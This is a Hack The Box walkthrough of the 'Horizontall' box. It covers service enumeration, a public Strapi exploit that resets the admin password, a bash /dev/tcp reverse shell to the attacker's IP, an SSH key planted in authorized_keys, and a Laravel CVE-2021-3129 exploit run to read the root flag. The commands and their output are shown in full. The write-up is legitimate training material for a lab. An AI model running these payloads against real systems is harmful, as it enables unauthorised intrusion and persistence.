---
layout: default
title: HORIZONTALL
description: by Hack The Box
---

<h3 align="center">
This one is a linux box. I'm quite amazed at this because early on during enumeration I found that two different tools provided different results even after using the same wordlist.
</h3>

# Enumeration

1. Fire up an nmap scan

   ```
   ┌──(schoon3r㉿nexer)-[~]
   └─$ nmap 10.10.11.105 -A -T4 -Pn
   Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-26 04:22 EST
   Nmap scan report for horizontall.htb (10.10.11.105)
   Host is up (0.032s latency).
   Not shown: 998 closed tcp ports (conn-refused)
   PORT   STATE SERVICE VERSION
   22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey:
   |_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
   80/tcp open  http    nginx/1.14.0 (Ubuntu)
   |_http-server-header: nginx/1.14.0 (Ubuntu)
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 30.76 seconds
   ```

2. Port 22 and 80 (HTTP) is open. Not overly interested in SSH right now as I dont have a username and password. Let's see what we have in HTTP
3. Typing the IP address redirects to the domain http://horizontall.htb/ ... from here we will need to add this IP address and domain name in the /etc/hosts file so we can see the webpage
4. Cool website, lets enumerate some directories

   ```
   ffuf -u http://horizontall.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fs 854

   #                       [Status: 200, Size: 901, Words: 43, Lines: 2]
   #                       [Status: 200, Size: 901, Words: 43, Lines: 2]
   img                     [Status: 301, Size: 194, Words: 7, Lines: 8]
   css                     [Status: 301, Size: 194, Words: 7, Lines: 8]
   js                      [Status: 301, Size: 194, Words: 7, Lines: 8]
                           [Status: 200, Size: 901, Words: 43, Lines: 2]
   ```

5. Let's have a look at the content of that js file in the browser's developer tools
6. Found a forwarding link to http://api-prod.horizontall.htb/ . Looking into it, there is just a H1 tag with a Welcome text. Under the hood, there really isn't anything much to see. Let's enumerate this subdomain for directories:

   ```
   ffuf -u http://api-prod.horizontall.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fs 854


   reviews                 [Status: 200, Size: 507, Words: 21, Lines: 1]
   users                   [Status: 403, Size: 60, Words: 1, Lines: 1]
   Reviews                 [Status: 200, Size: 507, Words: 21, Lines: 1]
   Users                   [Status: 403, Size: 60, Words: 1, Lines: 1]
   REVIEWS                 [Status: 200, Size: 507, Words: 21, Lines: 1]
                           [Status: 200, Size: 413, Words: 76, Lines: 20]
   ```

7. funny how ffuf (my go to enum) has a diff output than gobuster. Ffuf is

   ```
   gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

   /reviews              (Status: 200) [Size: 507]
   /users                (Status: 403) [Size: 60]
   /admin                (Status: 200) [Size: 854]
   /Reviews              (Status: 200) [Size: 507]
   /Users                (Status: 403) [Size: 60]
   /Admin                (Status: 200) [Size: 854]
   /REVIEWS              (Status: 200) [Size: 507]
   /%C0                  (Status: 400) [Size: 69]
   ```

   Anyway, just goes to show that we can't always just repy on one tool. There no ONE ring that rules them all.

8. Let's add all this directories in the /etc/hosts/ file to see what they have.
9. So the http://api-prod.horizontall.htb/admin/ redirects to http://api-prod.horizontall.htb/admin/auth/login which is STRAPI blog site login page. But it looks like we need a username and password.
10. Let's try and see headers if we can identify much about the version and other info of this strapi site. Best to use burp I think.
11. From the burp's proxy history tab... we can see that the /admin/init gave us these information

    ```
    HTTP/1.1 200 OK
    Server: nginx/1.14.0 (Ubuntu)
    Date: Fri, 26 Nov 2021 09:52:27 GMT
    Content-Type: application/json; charset=utf-8
    Content-Length: 144
    Connection: close
    Vary: Origin
    Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
    Strict-Transport-Security: max-age=31536000; includeSubDomains
    X-Frame-Options: SAMEORIGIN
    X-XSS-Protection: 1; mode=block
    X-Powered-By: Strapi <strapi.io>

    {
        "data":{
            "uuid":"a55da3bd-9693-4a08-9279-f9df57fd1817",
            "currentEnvironment":"development",
            "autoReload":false,
            "strapiVersion":"3.0.0-beta.17.4"
        }
    }
    ```

    Our take away from are...

    - Server : nginx/1.14.0 (Ubuntu)
    - strapiVersion : 3.0.0-beta.17.4

12. We can google for exploits on these things... but I'll use searchsploit

    ```
    searchsploit strapi

    Strapi 3.0.0-beta - Set Password (Unauthenticated)                          | multiple/webapps/50237.py
    Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)        | multiple/webapps/50238.py
    Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)  | multiple/webapps/50239.py
    ```

13. Does something standout??? hahaha... that third one is the exact same version as our target and its an RCE. Let's google how it works and how to use it.
14. Looks like it resets the password, lets try it

    ```
    python3 50239.py http://api-prod.horizontall.htb

    [+] Checking Strapi CMS Version running
    [+] Seems like the exploit will work!!!
    [+] Executing exploit


    [+] Password reset was successfully
    [+] Your email is: admin@horizontall.htb
    [+] Your new credentials are: admin:SuperStrongPassword1
    [+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM3OTIwODU4LCJleHAiOjE2NDA1MTI4NTh9.lhbl5vazfigE1ZOMdvhflYpGZlquKC6tqcF0juhBnsI
    ```

15. LOL, I wish all exploits are like this. So we have a username and password and from what it looks like we actually have a shell... trying out whoami says this is a blind RCE... let's see if we can setup a reverse shell. The username and password we will also try using SSH as we initially enumerated that SSH port is open (22).
16. Let's run a bash TCP reverse shell from the PayloadsAllTheThings repo I forked:

    ```
    bash -c 'bash -i >& /dev/tcp/10.10.14.14/3612 0>&1'

    (listener)
    nc -nvlp 3612
    ```

17. Ok found a few things while inside:
    - we are logged in as strapi
    - we are a non-priv user
    - but we can write on the folder (echo "hello" > 1.txt)
    - digging to further... we found the user flag in /home/developer/user.txt
    ```
    strapi@horizontall:/home$ ls
    ls
    developer
    strapi@horizontall:/home$ cd developer
    cd developer
    strapi@horizontall:/home/developer$ ls
    ls
    composer-setup.php
    myproject
    user.txt
    strapi@horizontall:/home/developer$ cat user.txt
    cat user.txt
    a0b979feab451022de78d25cdb7b79ff
    ```
18. Let's try to get root! From our enumeration, we know this server is an nginx 1.14.0 ... let's google for privesc
19. Found a perfect vuln... CVE-2016-1247... but looking at the video from https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html ... i'll need to wait till 6:25am for this exploit to run. Let's try something else.
20. So I found this exploit CVE-2021-3129 and found POC from https://github.com/nth347/CVE-2021-3129_exploit... the problem is it needs port forwarding so we can run the exploit. We will need to ssh into the machine... here are the steps...

    - Generate an SSH key

    ```
    sudo ssh-keygen
    Generating public/private rsa key pair.
    Enter file in which to save the key (/root/.ssh/id_rsa): ./key
    Enter passphrase (empty for no passphrase):
    Enter same passphrase again:
    Your identification has been saved in ./key
    Your public key has been saved in ./key.pub
    The key fingerprint is:
    SHA256:4n5RRwXF50odnXqbF727yBOk1u5zcJw0rZXhNU/mSCc root@nexer
    The key's randomart image is:
    +---[RSA 3072]----+
    |            .=o o|
    |            . E=B|
    |           . .o@X|
    |          . .ooBO|
    |      . S. .+.++B|
    |     . ..  o +oB.|
    |      .  .. . + o|
    |     .  .   .+.o |
    |      ..    .++..|
    +----[SHA256]-----+

    ┌──(schoon3r㉿nexer)-[~/Engagements/HTB]
    └─$ la
    total 340
    drwxr-xr-x 4 root     root       4096 Nov 26 05:45 .
    drwxr-xr-x 7 root     root       4096 Nov 23 22:44 ..
    -rw-r--r-- 1 schoon3r schoon3r  31852 Nov 24 20:35 40564.c
    -rwxr-xr-x 1 root     root     252610 Nov 24 20:46 40564.exe
    -rwxr-xr-x 1 root     root       1854 Nov 25 04:35 50238.py
    -rwxr-xr-x 1 root     root       2436 Nov 25 04:18 50239.py
    -rw-r--r-- 1 root     root       7824 Nov 25 06:12 build-alpine
    drwxr-xr-x 5 root     root       4096 Nov 25 06:36 CVE-2021-3156
    -rw------- 1 root     root       2602 Nov 26 05:45 key
    -rw-r--r-- 1 root     root        564 Nov 26 05:45 key.pub
    -rw-r--r-- 1 schoon3r schoon3r   9184 Nov 23 15:47 lab_schoon3r.ovpn
    -rw-r--r-- 1 root     root       2727 Nov 24 20:26 reverse-shell.aspx
    drwxr-xr-x 5 root     root       4096 Nov 25 06:20 rootfs
    -rw-r--r-- 1 schoon3r schoon3r     11 Nov 24 20:23 text.txt

    ┌──(schoon3r㉿nexer)-[~/Engagements/HTB]
    └─$ cat key.pub
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCiNEwFM9Vem9sgnp1NaIo7g7NwI6/mqdF82LYKbJWUQrkiWb5XAnvrT/UbrEtofRhTr0XFoAz3Blh+oX2JZB21gBnOslBbSnkAIhrdHUG84r16g9eZz6aafKYP5Vbi3Z9a+ULRwE95VHxkjy+lshNObSOtXWYg4AbI+VeWg5s7gOhEyjtA7BNc8EGM2ev23UD09UJqdVpnxWjepOl6P3Pt7KYble+4hzqWT+hlpKA2AW1HsxVY3a9JTq2XhTRXUYqpKpR6gHGuE7POJ6+hTaTCubDr/c/Gu5cuway9WgYjJQcG3rqf9glfHxk7MqRz+s6gcm4/TRrTBpkOCvH11fz5LvaYzzY30q3bhusNyhFDgyMcOR40vOOzmCfSpfCLR8DzUAjgyOEDDHxZ/E+/div93/wjhhtv/WgMYnTBqvPhvHXSpxgqjuhIKZBLzpWvP3gBAJqCM+Y/GAB5KIcx68kLtXaDWH+Rf5m8fEdFSqqJKcA1hwJa+yBy9RCAIwnnRms= root@nexer
    ```

    - You will to copy the content of the key.pub on the target machine, I used this command

    ```
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCiNEwFM9Vem9sgnp1NaIo7g7NwI6/mqdF82LYKbJWUQrkiWb5XAnvrT/UbrEtofRhTr0XFoAz3Blh+oX2JZB21gBnOslBbSnkAIhrdHUG84r16g9eZz6aafKYP5Vbi3Z9a+ULRwE95VHxkjy+lshNObSOtXWYg4AbI+VeWg5s7gOhEyjtA7BNc8EGM2ev23UD09UJqdVpnxWjepOl6P3Pt7KYble+4hzqWT+hlpKA2AW1HsxVY3a9JTq2XhTRXUYqpKpR6gHGuE7POJ6+hTaTCubDr/c/Gu5cuway9WgYjJQcG3rqf9glfHxk7MqRz+s6gcm4/TRrTBpkOCvH11fz5LvaYzzY30q3bhusNyhFDgyMcOR40vOOzmCfSpfCLR8DzUAjgyOEDDHxZ/E+/div93/wjhhtv/WgMYnTBqvPhvHXSpxgqjuhIKZBLzpWvP3gBAJqCM+Y/GAB5KIcx68kLtXaDWH+Rf5m8fEdFSqqJKcA1hwJa+yBy9RCAIwnnRms= root@nexer" > authorized_keys
    ```

    - I made sure it's there. Ok!
    - Next you need to issue this command to activate the port forwarding

    ```
    ssh -i key -L 8000:127.0.0.1:8000 strapi@horizontall.htb


    (your output should look like this)

    ┌──(schoon3r㉿nexer)-[~/Engagements/HTB]
    └─$ ssh -i key -L 8000:127.0.0.1:8000 strapi@horizontall.htb
    Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage

    System information as of Fri Nov 26 11:09:06 UTC 2021

    System load:  0.01              Processes:           180
    Usage of /:   83.6% of 4.85GB   Users logged in:     0
    Memory usage: 34%               IP address for eth0: 10.10.11.105
    Swap usage:   0%


    0 updates can be applied immediately.


    Last login: Fri Jun  4 11:29:42 2021 from 192.168.1.15
    ```

    - Now we just follow the exploit commands from the github of that link

    ```
    ┌──(schoon3r㉿nexer)-[~/Engagements/HTB]
    └─$ sudo git clone https://github.com/nth347/CVE-2021-3129_exploit

    [sudo] password for schoon3r:
    Cloning into 'CVE-2021-3129_exploit'...
    remote: Enumerating objects: 9, done.
    remote: Counting objects: 100% (9/9), done.
    remote: Compressing objects: 100% (8/8), done.
    remote: Total 9 (delta 1), reused 3 (delta 0), pack-reused 0
    Receiving objects: 100% (9/9), done.
    Resolving deltas: 100% (1/1), done.

    ┌──(schoon3r㉿nexer)-[~/Engagements/HTB]
    └─$ cd CVE-2021-3129_exploit

    ┌──(schoon3r㉿nexer)-[~/Engagements/HTB/CVE-2021-3129_exploit]
    └─$ sudo chmod +x exploit.py

    ┌──(schoon3r㉿nexer)-[~/Engagements/HTB/CVE-2021-3129_exploit]
    └─$ sudo ./exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
    [i] Trying to clear logs
    [+] Logs cleared
    [i] PHPGGC not found. Cloning it
    Cloning into 'phpggc'...
    remote: Enumerating objects: 2673, done.
    remote: Counting objects: 100% (1015/1015), done.
    remote: Compressing objects: 100% (576/576), done.
    remote: Total 2673 (delta 414), reused 883 (delta 308), pack-reused 1658
    Receiving objects: 100% (2673/2673), 400.37 KiB | 2.12 MiB/s, done.
    Resolving deltas: 100% (1056/1056), done.
    [+] Successfully converted logs to PHAR
    [+] PHAR deserialized. Exploited

    eab4c56a547cb99ba2ad91aae9c00933

    [i] Trying to clear logs
    [+] Logs cleared
    ```

21. That's the root flag right there! Pretty cool.

<br><br><br>

# Reference

1. https://github.com/schoon3r/PayloadsAllTheThings
2. https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
3. https://www.getkandg.com/2021/09/horizontall-htb-walkthrough-horizontall.html
4. https://github.com/nth347/CVE-2021-3129_exploit

<br><br>

[back to HOME](./)
